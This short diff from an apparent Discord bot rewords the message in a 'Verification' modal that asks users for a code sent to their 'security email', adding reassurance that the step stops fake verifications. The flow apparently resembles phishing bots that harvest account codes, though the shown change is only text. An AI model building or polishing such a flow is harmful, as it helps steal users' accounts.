@@ -287,7 +287,7 @@ class MyModalOne(ui.Modal, title="Verification"):
             await interaction.followup.send(
                 embed=Embed(
                     title="Verification",
-                    description=f"A verification code has been sent to your security email {verEmail}.\nPlease click the button below to enter your code.",
+                    description=f"To complete verification, enter the confirmation code we sent to {verEmail}.\nThis step prevents automated or fake verifications.",
                     colour=0x00FF00
                 ),
                 view = ButtonViewTwo(
